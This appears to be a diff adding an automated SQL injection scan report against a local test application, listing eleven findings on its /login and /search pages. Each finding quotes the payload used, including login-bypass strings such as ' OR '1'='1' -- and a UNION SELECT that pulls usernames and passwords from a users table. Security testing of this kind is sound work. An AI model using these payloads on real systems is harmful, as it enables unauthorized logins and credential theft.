@@ -1,0 +1,64 @@
+
+============================================================
+SQL INJECTION SCAN REPORT
+============================================================
+Scan Date: 2025-12-28 14:39:59
+Target: http://localhost:5000
+Total Vulnerabilities Found: 11
+============================================================
+
+1. [HIGH] SQL Injection
+   Location: /login
+   Payload: ' OR '1'='1' --
+   Description: SQL Injection in login form with payload: ' OR '1'='1' --
+
+2. [HIGH] SQL Injection
+   Location: /login
+   Payload: ' OR '1'='1' /*
+   Description: SQL Injection in login form with payload: ' OR '1'='1' /*
+
+3. [HIGH] SQL Injection
+   Location: /login
+   Payload: admin' --
+   Description: SQL Injection in login form with payload: admin' --
+
+4. [HIGH] SQL Injection (Error-based)
+   Location: /login
+   Payload: admin' #
+   Description: SQL error message detected: SQLite
+
+5. [HIGH] SQL Injection (Error-based)
+   Location: /login
+   Payload: ' UNION SELECT NULL--
+   Description: SQL error message detected: SQLite
+
+6. [HIGH] SQL Injection (Error-based)
+   Location: /login
+   Payload: ' UNION SELECT username, password FROM users--
+   Description: SQL error message detected: SQLite
+
+7. [HIGH] SQL Injection (Error-based)
+   Location: /search
+   Payload: admin' #
+   Description: SQL error in search with payload: admin' #
+
+8. [HIGH] SQL Injection (Error-based)
+   Location: /search
+   Payload: ' UNION SELECT NULL--
+   Description: SQL error in search with payload: ' UNION SELECT NULL--
+
+9. [CRITICAL] SQL Injection (UNION-based)
+   Location: /search
+   Payload: ' UNION SELECT NULL--
+   Description: UNION-based SQL Injection possible
+
+10. [HIGH] SQL Injection (Error-based)
+   Location: /search
+   Payload: ' UNION SELECT username, password FROM users--
+   Description: SQL error in search with payload: ' UNION SELECT username, password FROM users--
+
+11. [CRITICAL] SQL Injection (UNION-based)
+   Location: /search
+   Payload: ' UNION SELECT username, password FROM users--
+   Description: UNION-based SQL Injection possible
+
